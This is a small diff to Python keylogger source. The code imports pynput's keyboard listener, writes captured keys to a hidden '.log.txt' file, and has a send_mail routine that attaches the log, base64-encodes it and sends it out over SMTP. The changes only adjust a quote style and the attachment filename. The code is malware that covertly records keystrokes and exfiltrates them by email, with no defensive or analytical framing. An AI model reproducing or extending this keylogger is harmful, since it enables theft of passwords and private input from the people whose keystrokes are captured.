@@ -1,6 +1,6 @@
 from pynput import keyboard
 
-f = open(".log.txt","a+")
+f = open('.log.txt',"a+")
 
 """
 ===========================
@@ -41,7 +41,7 @@ def send_mail(sender, sender_password, reciever):
     payload.set_payload((attach_file).read())
     encoders.encode_base64(payload) #encode the attachment
 
-    payload.add_header('Content-Decomposition', 'attachment', filename='log.txt')
+    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
     msg.attach(payload)
 
     s = smtplib.SMTP(server, port)
